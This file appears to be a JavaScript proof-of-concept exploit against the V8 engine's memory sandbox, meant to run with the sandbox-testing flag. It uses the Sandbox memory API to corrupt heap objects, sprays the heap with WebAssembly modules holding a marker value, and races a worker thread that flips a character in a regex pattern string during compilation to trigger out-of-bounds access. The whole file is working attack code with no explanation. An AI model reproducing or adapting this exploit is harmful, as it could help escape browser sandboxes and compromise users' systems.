// --sandbox-testing
const kHeapObjectTag = 1;
const kSmiTagSize = 1;
const kNameRawHashFieldOffset = 4;
const kSeqOneByteStringCharsOffset = 0xc;
const kConsStringFirstOffset = 0xc;
const kSeqOneByteStringTypeMap = 0xb5;
const kConsOneByteStringTypeMap = 0x385;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getObj(ptr) {
  return Sandbox.getObjectAt(ptr);
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function getField64(obj, offset) {
  return memory.getBigUint64(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}
function setField64(obj, offset, value) {
  memory.setBigUint64(obj + offset - kHeapObjectTag, value, true);
}
function gc() {
  new ArrayBuffer(0x7fe00000);
}
function findObject(start, needle) {
  function match() {
    for (let k = 0; k < needle.length; ++k) {
      if (getField(start, k * 4) != needle[k]) return false;
    }
    return true;
  }
  while (!match()) start += 4;
  return start;
}

function re(s) {
  return new RegExp(s);
}

// just to avoid any potential problems with string consing
function cons_fst(cons) {
  return getObj(getField(getPtr(cons), kConsStringFirstOffset));
}

let SCAN_SIZE = 0xf;
let OOB_OFS = 0x7ff0;
let MAX_TRIES = 0x10000;
let TARGET = 0x424242424242n;

let flip_pos = 2 + 2 * SCAN_SIZE;
let _base = '\\1' + '()'.repeat(SCAN_SIZE) + '('.repeat(OOB_OFS) + ')'.repeat(OOB_OFS) + '[]';
let _base_map = getField(getPtr(_base), 0);
let base;
if (_base_map === kSeqOneByteStringTypeMap) {
  base = _base;             // already a SeqString, keep it as is
} else if (_base_map === kConsOneByteStringTypeMap) {
  re(_base);                // flatten ConsString
  base = cons_fst(_base);   // fetch flattened string from .first
} else {
  throw '??';
}

let base_ptr = getPtr(base);

// setup heap spray
console.log(`[*] spraying...`);
let spray_total = 0x2000000;
let spray_buf = new ArrayBuffer(0x800000);
try {   // bump mmap_threshold
  new WebAssembly.Module(spray_buf);
} catch {}

let spray_buf_u8 = new Uint8Array(spray_buf);
spray_buf_u8.set([0,97,115,109,1,0,0,0,0,243,255,255,3,0]);
new BigUint64Array(spray_buf).fill(TARGET, 2);

let spray_modules = [];
let spray_cnt = spray_total / spray_buf.byteLength;
for (let i = 0; i < spray_cnt; i++) {
  if (i % 0x10 == 0) {
    console.log(`[*] spray ${i} / ${spray_cnt} (${(i * 100 / spray_cnt).toFixed(2)}%)`);
  }
  spray_buf_u8[0xf] = i;
  spray_modules.push(new WebAssembly.Module(spray_buf));
}

let workerScript = `
  // Prepare corruption utilities.
  const kHeapObjectTag = 1;
  let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
  function setField8(obj, offset, value) {
    memory.setUint8(obj + offset - kHeapObjectTag, value);
  }
  let base_ptr = ${base_ptr};
  let flip_ofs = ${kSeqOneByteStringCharsOffset + flip_pos};
  while (true) {
    setField8(base_ptr, flip_ofs, 0x5b);  // '['
    setField8(base_ptr, flip_ofs, 0x28);  // '('
  }
`;
let worker = new Worker(workerScript, {type: 'string'});

for (let i = 0; i < MAX_TRIES; i++) {
  console.log(i);
  setField(base_ptr, kNameRawHashFieldOffset, (i << 2) | 0);
  re(base);
}
